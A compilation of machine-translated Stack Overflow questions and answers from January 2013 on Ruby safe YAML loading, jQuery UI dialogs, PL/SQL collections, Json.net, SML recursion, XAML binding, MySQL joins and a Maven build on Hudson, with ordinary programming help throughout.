Rails 中一个相当[引人注目的安全漏洞](https://news.ycombinator.com/item?id=5028270)最近揭示了在 Ruby 应用程序中解析用户提供的 YAML 的潜在危险。

快速的 Google 搜索显示[Python 的 YAML 库](http://pyyaml.org/wiki/PyYAMLDocumentation)包含一个`safe_load`方法，该方法只会反序列化“简单的 Python 对象，如整数或列表”，而不是任何任意类型的对象。

Ruby 有等价物吗？有没有办法在 Ruby 应用程序中安全地接受 YAML 输入，而无需手动编写自定义解析器？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T14:49:55.400

按照[Jim 的建议](https://stackoverflow.com/a/14348691/105570)，我继续编写了[**safe_yaml**](https://github.com/dtao/safe_yaml)，这是一个添加`YAML.safe_load`方法并在内部使用 Psych 来完成繁重工作的 gem。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T23:14:38.587

使用到`Psych`（实际的解析器引擎）的较低级别的接口，可以访问较低级别的结构，而无需将它们序列化回 Ruby 对象（请参阅[http://rubydoc.info/stdlib/psych/Psych/Parser](http://rubydoc.info/stdlib/psych/Psych/Parser)）。这并不像 那么容易`safe_load`，但它确实提供了实现它的途径。

可能还有其他选项可以在`Syck`和`Psych`中使用，并且更直接，例如`safe_load`。

# jquery - 如何在不使用生成的按钮的情况下从 JQuery UI 关闭 .dialog 窗口

> ID：14348542
> 
> 赞同：0
> 
> 时间：2013-01-15T23:01:47.477
> 
> 标签：jquery, jquery-ui

嘿伙计们，所以在 JQuery ui 中它会产生一个关闭链接，一旦单击它就会关闭对话框。我的问题是如何在不使用该按钮的情况下将其关闭？

我有一个弹出的服务条款，我需要使用`decline terms`链接而不是`close button`从 ui 生成的链接。

所以让我知道我是怎么做的，谢谢:)

编辑：

我使用了以下代码并且没有雪茄 - 告诉我未捕获的错误：在初始化之前无法调用对话框上的方法；试图调用方法“关闭”

```
function decline(){

     $( '#decline' ).dialog( 'close' );

    } 
```

一旦选择器被点击，它就会有一个 onclick="" 发送到这里。选择器是 id="decline"

这是我页面上抓取对话框的整个代码 -

```
$(function() {
        $( "dialog:ui-dialog" ).dialog( "destroy" );
    });
    function showUrlInDialog(url){
      var tag = $("<div></div>");
      $.ajax({
        url: url,
        success: function(data) {
          tag.html(data).dialog
          ({
              width: '100%',
                modal: true
          }).dialog('open');
        }
      });
    }
    function agree(){
        alert("Handler for .click() called.");
    }
    function decline(){

     $( '#decline' ).dialog( 'close' );

    } 
```

这是将初始化它的选择器 -

```
<a href="#" onclick="showUrlInDialog('termsofservice.php'); return false;">link to page B</a> 
```

这是我想要关闭对话框的选择器 -

```
<a href="#" onclick="decline();" id="decline"><span >I decline these terms</span></a> 
```

编辑 -

这是我正在使用但没有成功的新代码：

```
function decline(){

     $( '#terms-container' ).dialog( 'close' );

    } 
```

# terms-container 是初始化程序获取数据的另一个文件的主 div

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:03:32.897

尝试使用`$( '.dialog' ).dialog( 'close' );`

用您的选择器替换“.dialog”

```
$( 'a#decline' ).on( 'click', function() {
    $( this ).closest( '.ui-dialog' ).dialog( 'close' );
}) ; 
```

由于您的代码是使用内联 javascript 设置的，因此上述方法不起作用。尝试将您的拒绝功能更改为此

```
function decline() {
 $( 'dialog:ui-dialog' ).dialog( 'close' );
 // OR THIS
 $( '.ui-dialog' ).children( 'div' ).eq( 0 ).dialog( 'close' );
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:26:23.253

由于您需要从其他地方关闭对话框，我建议创建一个 div 来从 ajax 调用中获取您的 html，而不是动态创建它。html:

```
<a href="#" onclick="showUrlInDialog('termsofservice.php'); return false;">link to page B</a>
<a href="#" onclick="decline();" id="decline"><span >I decline these terms</span></a>
<div id="dialog-container"></div> 
```

Javascript：

```
$(function() {
    $("#dialog-container").dialog( "destroy" );
});
function showUrlInDialog(url){
  var tag = $("#dialog-container");
  $.ajax({
    url: url,
    success: function(data) {
      tag.html(data).dialog
      ({
          width: '100%',
            modal: true
      }).dialog('open');
    }
  });
}
function agree(){
    alert("Handler for .click() called.");
}
function decline(){

 $("#dialog-container").dialog( 'close' );

} 
```

# oracle - 将 1 到 20 个文本区域的内容插入表中（Oracle 应用服务器 10g）

> ID：14348548
> 
> 赞同：1
> 
> 时间：2013-01-15T23:02:17.307
> 
> 标签：oracle, plsql, oracle10g, oracleforms, oas

我有一个 Oracle 应用服务器 (10g) 包，它基本上显示了用户在单击编辑按钮后可以编辑的数据行。编辑页面包含 1 到 20 个文本字段。在用户需要插入超过 ident_arr varchar2(30) 字符限制之前，使用 owa_util.ident_arr 效果很好。

现在我不能使用 ident_arr，我想弄清楚如何将文本区域 (htp.formtextareaopen) 的内容插入到表格中。正如我所说，编辑页面中可以有 1 到 20 个文本字段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T11:42:28.147

在不了解您的实现的情况下，我应该说您需要创建自己的集合类型。首先从文档中检查 owa_util.ident_arr 到底是什么：

```
type ident_arr is table of varchar2(30) index by binary_integer; 
```

然后，您需要做的是使用大于 30 的 varchar2:s 表创建自己的集合，例如

```
type my_arr is table of varchar2(255) index by binary_integer; 
```

# javascript - 如何从标签中获取 textContent？

> ID：14348553
> 
> 赞同：0
> 
> 时间：2013-01-15T23:02:54.383
> 
> 标签：javascript, dom

我正在编写一个greasemonkey 脚本来将一些原始数字格式化为数千。格式化功能就好了。问题是：一些数字放在 img 标签上，例如：

```
<div class = "opinion">
    <img class ="icon-like" alt="img" src="like.png">1148597
    <img class="icon-dislike" alt="img" src="dislike.png">600000000
</div> 
```

由于定义的 img 标签[没有子节点](http://reference.sitepoint.com/javascript/Node/hasChildNodes)，迭代 imgs 以将格式化的数字放回它们的最佳方法是什么？如果我使用 .innerHTML，则会删除 img 标签，只显示格式化的数字。

tnx 提前。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:07:45.680

只需调用[`nextSibling`](https://developer.mozilla.org/en-US/docs/DOM/Node.nextSibling)图像，然后用于[`textContent`](https://developer.mozilla.org/en-US/docs/DOM/Node.textContent)实际获取文本：

```
var images = document.querySelectorAll('.opinion img');

Array.prototype.forEach.call(images, function (el) {
    var text = el.nextSibling.textContent;
    // Use the text associated with the image...
}); 
```

这是小提琴：http: [//jsfiddle.net/TYGAq/](http://jsfiddle.net/TYGAq/)

# c# - 如何检测 WindowsService 属性的变化？

> ID：14348560
> 
> 赞同：0
> 
> 时间：2013-01-15T23:03:25.170
> 
> 标签：c#, events, service, windows-services

如何检测`ServiceStartMode`物业的变化`WindowsService`？一开始是`Automatic`，但后来有人将其更改为`Manual`- 如何捕获此事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:43:00.447

您无法检测到服务 StartMode 的更改，因为没有与该特定情况相关联的事件......但是，使用 System.Management 功能，您可以随时检查服务的当前 StartMode 并最终更改它。请看一下[这个非常好的代码片段](http://www.codeproject.com/Articles/28161/Using-WMI-to-manipulate-services-Install-Uninstall)，它实现了一个完整的特性类，允许你操作它。

# php - 执行 array_key_exists 抛出错误

> ID：14348563
> 
> 赞同：0
> 
> 时间：2013-01-15T23:03:31.867
> 
> 标签：php, session

我收到的以下错误是

```
Warning: array_key_exists() expects parameter 2 to be array, 
null given in /home/*****/public_html/class/alerts.php on line 14 
```

在 class/alerts.php 的第 14 行，我看到以下行

```
if(!array_key_exists('flash_messages', $_SESSION)) $_SESSION['flash_messages'] = array(); 
```

我正在使用的问题是在 $_SESSION 但我不确定

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:05:27.670

此错误表明`$_SESSION`为空。这可能是由于未调用`session_start()`或浏览器不接受 cookie 造成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:05:52.850

在尝试对其进行索引之前，我会首先检查 $_SESSION 是否已设置且不为空。

# c# - Json.net 如何使用带有“$”的 jsonpath。

> ID：14348567
> 
> 赞同：0
> 
> 时间：2013-01-15T23:03:46.120
> 
> 标签：c#, json.net, jsonpath

我正在尝试使用来自 json 的 json.net，如下所示：

```
String JSONString =
@"[
    {
      ""category"": ""reference"",
      ""author"": ""Nigel Rees"",
      ""title"": ""Sayings of the Century"",
      ""price"": 8.95
    },
    {
      ""category"": ""fiction"",
      ""author"": ""Still Here"",
      ""title"": ""Test remove title"",
      ""price"": 12.99,
      ""isbn"": ""0-553-21311-3""
    }
  ]";

JObject JSONObject;
JSONObject = JObject.Parse(JSONString);

String JSONPath = @"$[0].title";
JSONObject.SelectToken(JSONPath); 
```

获得例外：

```
ST.Acxiom.Test.DataJSONTest.DataJSONClass.GetToken: Newtonsoft.Json.JsonException :   Property '$' does not exist on JObject. 
```

*   我做错了什么，即使我使用了有效的 jsonpath 但仍然出错。
*   是“$”。不支持？
*   如何在上面的示例中访问 json 中的数组项？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T12:45:58.700

1.  使用`JObject.Parse`您的示例会抛出`JsonReaderException`最新的 Json.net 版本。您必须使用`JToken.Parse`或`JsonConvert.DeserializeObject`。
2.  [SelectToken](http://james.newtonking.com/projects/json/help/html/SelectToken.htm)旨在选择子节点，因此`$`不受支持。您可以像这样访问数组项：

```
var jArray = JToken.Parse(JSONString); //It's actually a JArray, not a JObject
var jTitle = jArray.SelectToken("[0].title");
var title = (string)jTitle; 
```

# sml - number_in_month 练习（迭代 SML 中的多个列表）

> ID：14348568
> 
> 赞同：2
> 
> 时间：2013-01-15T23:03:53.847
> 
> 标签：sml

我在 SML 中有两个列表，比如说 list A`[(a,b,c),(d,e,f)]`和 list B `[b,e]`。我想计算 B 中与 A 中每个三元组的第二个元素匹配的每个项目的出现次数。输出应该是 2。因为每个项目在 A`b`中`e`出现一次。

到目前为止，这是我的代码，但是当我在 B 中从一个元素移动到另一个元素时，我的计数器总是设置为 0。我知道在 Java 中这只是一个简单的双循环。

```
fun number_in_months (d : (int * int * int ) list, m : (int) list) = 
    if null m then 0 
    else if null d then number_in_months(d, tl m)
    else if (#2(hd d)) = (hd m) then 1 + number_in_months (tl d, m)
    else number_in_months(tl d, m) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:43:28.963

代码没有在递归调用之间累积值。也可能存在其他逻辑错误。

使用递归和函数累积值是一种常见模式，您可以在[此处](http://www.gnu.org/software/emacs/emacs-lisp-intro/html_node/Accumulate.html)了解更多信息。其本质是使用`head`and解构列表，`tail`直到列表为空并在每次调用时累积一些值。下面的`sum`函数是一个简单的例子来说明这一点。这可以根据您的示例进行调整`acc`，`b`以`e`在`list A`.

```
fun sum(numbers: (int) list) =
  let fun sumR(numbers: (int) list, acc: int) =
    if null numbers
    then acc
    else
      sumR(tl numbers, hd numbers + acc)
  in
    sumR(numbers, 0)
  end 
```

运行`[1,2,3]`给出：

```
val sum = fn : int list -> int
- sum([1,2,3]);
val it = 6 : int 
```

*请注意，我故意对这个答案含糊其辞，因为这是关于 Coursera 编程语言课程的作业的问题。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T01:28:29.127

正如您所提到的，这将是任何命令式编程语言中的嵌套/双循环。您实际上缺少的是第二个循环。

您的“内部”循环遍历 的所有元素`d`，完成后，您的“外部”循环会尝试弹出 的顶部元素`m`并重新开始，从代码的这一行可以看出：

```
else if null d then number_in_months(d, tl m) 
```

但是，正如您所看到的，您刚刚测试了该列表`d`为空，并且您将这个（完全相同的列表）提供给您在尾部的递归调用`m`，然后对于每个连续的调用，这将落在相同的情况下，直到`m`也是空的并且你返回 0。

因此，您缺少的是原始输入列表的“保留副本” `m`。这可以通过多种方式完成，但内部（辅助）函数是最常用的函数，它甚至“看起来”像一个嵌套循环

```
fun number_in_months (d, m) =
    let
      fun nim' ([], y::ys) = nim (d, ys)                 (* 1 *)
        | nim' (_, []) = 0                               (* 2 *)
        | nim' ((_, x2, _) :: xs, yss as (y::ys)) = ...  (* 3 *)
    in
      nim'(d, m)
    end 
```

使用与上述代码匹配的模式变得更加简单且不易出错。在情况 1 中，“内部”循环遍历了 中的所有元素`d`，因此使用外部函数的递归调用`d`在任何时候都不会更改。在情况 2 中，“外部”循环遍历了所有元素，`m`我们返回 0（加法的中性元素）。在案例 3 中，我们进行实际工作。这里使用了模式匹配，这样我们就不需要强制参数的类型，也不需要提取三元组的第二个元素，我们已经在变量中拥有了它`x2`。所需要做的就是进行计算并使用 and 进行递归`xs`调用`yss`。

When doing it this way, the inner (helper) function is using a "copy" of the original input list `d` and stepping through its elements (potentially modifying it), but we always got a reference to the original input list, which we can use if/when needed.

# visual-studio-2010 - 将视频保存为一系列图像opencv

> ID：14348571
> 
> 赞同：0
> 
> 时间：2013-01-15T23:03:57.547
> 
> 标签：visual-studio-2010, opencv, video-capture, video-processing

这个问题是[error-in-opencv-code-for-motion-detection 的](https://stackoverflow.com/questions/14309111/error-in-opencv-code-for-motion-detection)延续。编辑后的代码没有任何错误，但没有创建输出视频，它是零字节！这有什么问题？另外，为运动检测创建的​​边界框从未真正捕捉到运动，也就是说，它没有做它做的事情最初声称这样做。我是否误解了代码的目标？所以，这是我的问题：

1.  如何纠正创作并保存视频？
2.  需要修改什么来检测运动并跟踪它？
3.  如何将视频转换为每帧中的一系列编号 jpg 图像，反之亦然。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-28T06:05:06.780

这是您可以使用的代码，用于将视频构图为一组图像。

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "cv.h"
#include <highgui.h>
#include "cxcore.h" 

int main( int argc, char** argv )
{    
     CvCapture *capture = cvCaptureFromAVI("E:\\Myvideo.avi");
             if(!capture) 
    {
        printf("!!! cvCaptureFromAVI failed (file not found?)\n");
        return -1; 
    }

    int fps = (int) cvGetCaptureProperty(capture, CV_CAP_PROP_FPS);

    printf("* FPS: %d\n", fps);

    IplImage* frame = NULL;
    int frame_number = 0;
    char key = 0;   

    while (key != 'q') 
    {
        // get frame 
        frame = cvQueryFrame(capture);       
        if (!frame) 
        {
            printf("!!! cvQueryFrame failed: no frame\n");
            break;
        }       

        // quit when user press 'q'
        key = cvWaitKey(1000 / fps);
    }

    // free resources
    cvReleaseCapture(&capture);

    return 0;
} 
```

# c# - 用户控件响应添加到的页面中的事件

> ID：14348574
> 
> 赞同：0
> 
> 时间：2013-01-15T23:04:18.630
> 
> 标签：c#, button, user-controls

我有一个用户控件页面，上面有一个标签，标签的`onLoad`代码是用 C# 编写的。我添加用户控件的页面有一个按钮。我有什么方法可以对用户控件进行编码，以便它更改标签以响应按钮按下？这最好从 C# 中的用户控件页面完成。我不确定它是否会对此产生任何影响，但非用户控件页面的代码是在 VB 中完成的。

感谢您对此的任何见解。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:42:12.540

在您的 Page.aspx 代码中，为按钮单击添加声明性事件处理程序，并在其中添加以下代码以及其他逻辑 -

C＃

```
Protected void Button_OnClick(object sender, eventargs e)
{
   //Other logic responding to the click event within the page
   LabelUserControl.PageButton_Click(sender, e); 
} 
```

VB.NET

```
Protected Sub PageButton_Click(sender As Object, e As System.EventArgs) Handles PageButton.Click 
   LabelUserControl.PageButton_Click(sender, e)
End Sub 
```

或（如果用户控件标签更改是对点击的唯一响应）-

C＃

```
Protected void Page_Load(object sender, eventargs e)
{
   PageButton.Click += LabelUserControl.PageButton_Click;
} 
```

VB.NET

```
Sub Page_Load(ByVal Sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    AddHandler PageButton.Click, AddressOf LabelUserControl.PageButton_Click
End Sub 
```

在您的用户控制中-

```
public void PageButton_Click(object sender, eventargs e)
{
  // change label text
} 
```

该方法应该是公共的，以便可以从页面访问。

# c# - 有人能解释一下 Grid 项目在 Windows 8 中的工作原理吗

> ID：14348575
> 
> 赞同：0
> 
> 时间：2013-01-15T23:04:28.027
> 
> 标签：c#, xaml, windows-8

我正在查看 VS2012 附带的 windows 8 网格项目并试图理解它。我对 XAML 了解不多，所以我很容易忘记绑定代码发生在哪里等等。

```
<Page.Resources>

    <!--
        Collection of grouped items displayed by this page, bound to a subset
        of the complete item list because items in groups cannot be virtualized
    -->
    <CollectionViewSource
        x:Name="groupedItemsViewSource"
        Source="{Binding Groups}"
        IsSourceGrouped="true"
        ItemsPath="TopItems"
        d:Source="{Binding AllGroups, Source={d:DesignInstance Type=data:SampleDataSource, IsDesignTimeCreatable=True}}"/>
</Page.Resources>

<!--
    This grid acts as a root panel for the page that defines two rows:
    * Row 0 contains the back button and page title
    * Row 1 contains the rest of the page layout
-->
<Grid Style="{StaticResource LayoutRootStyle}">
    <Grid.RowDefinitions>
        <RowDefinition Height="140"/>
        <RowDefinition Height="*"/>
    </Grid.RowDefinitions>

    <!-- Horizontal scrolling grid used in most view states -->
    <GridView
        x:Name="itemGridView"
        AutomationProperties.AutomationId="ItemGridView"
        AutomationProperties.Name="Grouped Items"
        Grid.RowSpan="2"
        Padding="116,137,40,46"
        ItemsSource="{Binding Source={StaticResource groupedItemsViewSource}}"
        ItemTemplate="{StaticResource Standard250x250ItemTemplate}"
        SelectionMode="None"
        IsSwipeEnabled="false"
        IsItemClickEnabled="True"
        ItemClick="ItemView_ItemClick">

        <GridView.ItemsPanel>
            <ItemsPanelTemplate>                        
                <VirtualizingStackPanel Orientation="Horizontal"/>
            </ItemsPanelTemplate>
        </GridView.ItemsPanel>
        <GridView.GroupStyle>
            <GroupStyle>
                <GroupStyle.HeaderTemplate>
                    <DataTemplate>
                        <Grid Margin="1,0,0,6">
                            <Button
                                AutomationProperties.Name="Group Title"
                                Click="Header_Click"
                                Style="{StaticResource TextPrimaryButtonStyle}" >
                                <StackPanel Orientation="Horizontal">
                                    <TextBlock Text="{Binding Title}" Margin="3,-7,10,10" Style="{StaticResource GroupHeaderTextStyle}" />
                                    <TextBlock Text="{StaticResource ChevronGlyph}" FontFamily="Segoe UI Symbol" Margin="0,-7,0,10" Style="{StaticResource GroupHeaderTextStyle}"/>
                                </StackPanel>
                            </Button>
                        </Grid>
                    </DataTemplate>
                </GroupStyle.HeaderTemplate>
                <GroupStyle.Panel>
                    <ItemsPanelTemplate>
                        <VariableSizedWrapGrid Orientation="Vertical" Margin="0,0,80,0"/>
                    </ItemsPanelTemplate>
                </GroupStyle.Panel>
            </GroupStyle>
        </GridView.GroupStyle>
    </GridView>

    <!-- Vertical scrolling list only used when snapped -->
    <ListView
        x:Name="itemListView"
        AutomationProperties.AutomationId="ItemListView"
        AutomationProperties.Name="Grouped Items"
        Grid.Row="1"
        Visibility="Collapsed"
        Margin="0,-10,0,0"
        Padding="10,0,0,60"
        ItemsSource="{Binding Source={StaticResource groupedItemsViewSource}}"
        ItemTemplate="{StaticResource Standard80ItemTemplate}"
        SelectionMode="None"
        IsSwipeEnabled="false"
        IsItemClickEnabled="True"
        ItemClick="ItemView_ItemClick">

        <ListView.GroupStyle>
            <GroupStyle>
                <GroupStyle.HeaderTemplate>
                    <DataTemplate>
                        <Grid Margin="7,7,0,0">
                            <Button
                                AutomationProperties.Name="Group Title"
                                Click="Header_Click"
                                Style="{StaticResource TextPrimaryButtonStyle}">
                                <StackPanel Orientation="Horizontal">
                                    <TextBlock Text="{Binding Title}" Margin="3,-7,10,10" Style="{StaticResource GroupHeaderTextStyle}" />
                                    <TextBlock Text="{StaticResource ChevronGlyph}" FontFamily="Segoe UI Symbol" Margin="0,-7,0,10" Style="{StaticResource GroupHeaderTextStyle}"/>
                                </StackPanel>
                            </Button>
                        </Grid>
                    </DataTemplate>
                </GroupStyle.HeaderTemplate>
            </GroupStyle>
        </ListView.GroupStyle>
    </ListView>

    <!-- Back button and page title -->
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="*"/>
        </Grid.ColumnDefinitions>
        <Button x:Name="backButton" Click="GoBack" IsEnabled="{Binding Frame.CanGoBack, ElementName=pageRoot}" Style="{StaticResource BackButtonStyle}"/>
        <TextBlock x:Name="pageTitle" Text="{StaticResource AppName}" Grid.Column="1" IsHitTestVisible="false" Style="{StaticResource PageHeaderTextStyle}"/>
    </Grid>

    <VisualStateManager.VisualStateGroups>

        <!-- Visual states reflect the application's view state -->
        <VisualStateGroup x:Name="ApplicationViewStates">
            <VisualState x:Name="FullScreenLandscape"/>
            <VisualState x:Name="Filled"/>

            <!-- The entire page respects the narrower 100-pixel margin convention for portrait -->
            <VisualState x:Name="FullScreenPortrait">
                <Storyboard>
                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="backButton" Storyboard.TargetProperty="Style">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PortraitBackButtonStyle}"/>
                    </ObjectAnimationUsingKeyFrames>

                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemGridView" Storyboard.TargetProperty="Padding">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="96,137,10,56"/>
                    </ObjectAnimationUsingKeyFrames>
                </Storyboard>
            </VisualState>

            <!--
                The back button and title have different styles when snapped, and the list representation is substituted
                for the grid displayed in all other view states
            -->
            <VisualState x:Name="Snapped">
                <Storyboard>
                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="backButton" Storyboard.TargetProperty="Style">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource SnappedBackButtonStyle}"/>
                    </ObjectAnimationUsingKeyFrames>
                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="pageTitle" Storyboard.TargetProperty="Style">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource SnappedPageHeaderTextStyle}"/>
                    </ObjectAnimationUsingKeyFrames>

                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemListView" Storyboard.TargetProperty="Visibility">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="Visible"/>
                    </ObjectAnimationUsingKeyFrames>
                    <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemGridView" Storyboard.TargetProperty="Visibility">
                        <DiscreteObjectKeyFrame KeyTime="0" Value="Collapsed"/>
                    </ObjectAnimationUsingKeyFrames>
                </Storyboard>
            </VisualState>
        </VisualStateGroup>
    </VisualStateManager.VisualStateGroups>
</Grid> 
```

我不明白的第一个领域是这个

```
 <CollectionViewSource
            x:Name="groupedItemsViewSource"
            Source="{Binding Groups}"
            IsSourceGrouped="true"
            ItemsPath="TopItems"
            d:Source="{Binding AllGroups, Source={d:DesignInstance Type=data:SampleDataSource, IsDesignTimeCreatable=True}}"/> 
```

我不知道这 `Source="{Binding Groups}"`实际上来自哪里（我什至不确定如何找到代码 F12 不起作用）。

与`d:Source`不确定 100% 的情况相同。

下一部分是在 gridview 中，然后是绑定。

```
<GridView
            x:Name="itemGridView"
            AutomationProperties.AutomationId="ItemGridView"
            AutomationProperties.Name="Grouped Items"
            Grid.RowSpan="2"
            Padding="116,137,40,46"
            ItemsSource="{Binding Source={StaticResource groupedItemsViewSource}}"
            ItemTemplate="{StaticResource Standard250x250ItemTemplate}"
            SelectionMode="None"
            IsSwipeEnabled="false"
            IsItemClickEnabled="True"
            ItemClick="ItemView_ItemClick"> 
```

我看到 Items Source 正在使用该 groupItemsViewSource 但不确定它如何将数据解析为网格外观但不确定如何。

我不明白的下一部分是它如何确定要使用的布局。我在评论中看到了这个

```
 <!-- Horizontal scrolling grid used in most view states -->
<!-- Vertical scrolling list only used when snapped --> 
```

我敢肯定，如果我更深入地研究它，我会发现更多我不理解的东西，但也许当我理解这些东西时，我会理解更多（尤其是一旦我理解了这些绑定的东西）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:56:24.757

*我不知道这个 Source="{Binding Groups}" 实际来自哪里（我什至不确定如何找到代码 F12 不起作用）。*

页面顶部的注意事项：

```
DataContext="{Binding DefaultViewModel, RelativeSource={RelativeSource Self}}" 
```

它将该页面上绑定的上下文设置为页面的`DefaultViewModel`属性。在页面后面的代码中，您将看到

```
this.DefaultViewModel["Groups"] = sampleDataGroups; 
```

其中是从方法调用返回`sampleDataGroups`的组（类型）的列表（IEnumerable） 。`SampleDataGroup`现在你也有，

```
<CollectionViewSource
        x:Name="groupedItemsViewSource"
        Source="{Binding Groups}"
        IsSourceGrouped="true"
        ItemsPath="TopItems"
        d:Source="{Binding AllGroups, Source={d:DesignInstance Type=data:SampleDataSource, IsDesignTimeCreatable=True}}"/> 
```

这里的“组”是指索引 的键`DefaultViewModel`，因此它将使用`DefaultViewModel`. 此外，CollectionViewSource 中的每个项目本身都包含一个集合，这些集合在任何属性`ItemsPath`指定的位置（即`TopItems`.

现在从 GridView 绑定：

```
<GridView
        x:Name="itemGridView"
        AutomationProperties.AutomationId="ItemGridView"
        AutomationProperties.Name="Grouped Items"
        Grid.RowSpan="2"
        Padding="116,137,40,46"
        ItemsSource="{Binding Source={StaticResource groupedItemsViewSource}}"
        ItemTemplate="{StaticResource Standard250x250ItemTemplate}" 
```

您注意到数据来自名为 CollectionViewSource 的特定实例`groupedItemsViewSource`（在这种情况下相当于`this.DefaultViewModel["Groups"]`）。如果稍后再查看标题模板，您会看到：

```
<StackPanel Orientation="Horizontal">
     <TextBlock Text="{Binding Title}" Margin="3,-7,10,10" Style="{StaticResource GroupHeaderTextStyle}" />
     ... 
```

`Title`绑定是指集合中元素的属性，`ItemsSource`所以`this.DefaultViewModel["Groups"][i].Title`

`ItemTemplate="{StaticResource Standard250x250ItemTemplate}"`在 GridView 绑定中控制内部集合项的显示方式。您必须打开该样式（在 中`Common/StandardStyles.xaml`）才能看到它引用了 a 的属性`SampleDataItem`，本质上导致`this.DefaultViewModel["Groups"][i].TopItems[j]`.

前缀指的`d:`是设计时数据（嗯，一个包含管理它的类的命名空间）；它允许您在不运行应用程序的情况下在设计器中查看数据。因此，在设计时，您看到的数据实际上来自`SampleDataSource.AllGroups`.

至于关于滚动的评论，进入[VisualStateManager](http://msdn.microsoft.com/en-us/library/windows/apps/br209021.aspx)，每个状态本质上是对 UI 的不同看法；通过一些代码进行状态转换，您可以在`LayoutAwarePage.cs`look for [GotoState](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.visualstatemanager.gotostate.aspx)中找到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:55:53.220

> 我不知道这个 Source="{Binding Groups}" 实际来自哪里

绑定`DataContext`以元素为目标——要找到它，您通常会向上扫描 XAML 以查找上次设置 DataContext 的位置。所以在这种情况下，它必须以某种方式设置在`Page`元素上。（DataContext 也可以从代码隐藏中设置，尽管如果在 VS 示例项目中是这种情况，我会感到惊讶。）

> 与 d:Source 相同，也不确定 100% 那里发生了什么。

`d`前缀是指设计时数据。检查`SampleDataSource`，您可以在其中找到 的设计时实例`AllGroups`。

> 不确定它是如何将数据解析到网格中的

Grid 根据其行数据类型的属性自动生成其列。

# mysql - MySQL 使用 * 以及连接表中的列名

> ID：14348576
> 
> 赞同：1
> 
> 时间：2013-01-15T23:04:28.700
> 
> 标签：mysql, sql, join, left-join

我想从一个表中选择所有字段，以及使用`LEFT JOIN`. 我可以使用 * 从一个表中选择所有列，并从 ? 中命名特定字段`JOIN`？

像这样的东西：

```
SELECT * , table2.a, table2.b 
FROM table1
LEFT JOIN table2 ON table2.a = table1.a
WHERE ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:06:18.353

语法明智，它是正确的并且有效。但是，使用`*`. 我建议您始终指定一个列列表。如果列更改，您的应用程序可能会中断。它也总是更好的可读性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:08:22.997

要获取 table1 中的所有字段以及 table2 中的某些列，您将使用：

```
SELECT table1.*, table2.column, table2.column
FROM table1
LEFT JOIN table2 ON table2.a = table1.a
WHERE ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:09:20.140

您指定一个表中的所有列，`table1.*`如果使用，您将从*所有*`*`表中获取*所有*列。

 *MySQL 对通配符列名的顺序很挑剔——它们必须是第一个。*

# c++ - 无法在哈德逊使用 Maven 和 C++ 项目构建成功

> ID：14348578
> 
> 赞同：3
> 
> 时间：2013-01-15T23:04:34.597
> 
> 标签：c++, maven, hudson

我在哈德逊有一个用 maven 构建的项目。它编译 C++ 源代码以创建用于项目其他部分的可执行文件。它使用 Visual Studio 工具，特别是会导致问题的工具。当它试图加载 midl 程序时，它找不到它。如果我登录服务器是我的 Hudson 生活并尝试在该特定项目中运行 mvn clean install 我得到：

```
D:\Hudson\jobs\{project-name}>mvn clean install
.
.
.
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 1.876s
[INFO] Finished at: Mon Jan 14 21:56:18 PST 2013
[INFO] Final Memory: 8M/154M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.codehaus.mojo:exec-maven-plugin:1.2.1:exec (build-tlb) on project interop: Command execution failed.
Cannot run program "midl" (in directory "D:\Hudson\jobs\{project-name}"): CreateProcess error=2, The system cannot find the file specified ->     [Help 1]
[ERROR]
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR]
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR]     [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

解决此问题的一种方法是加载 Visual Studio 工具：

```
D:\Hudson\jobs\{project-name}>%VS100COMNTOOLS%\vsvars32.bat
Setting environment for using Microsoft Visual Studio 2010 x86 tools. 
```

之后，我得到了一个干净的构建：

```
D:\Hudson\jobs\{project-name}>mvn clean install
.
.
.
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
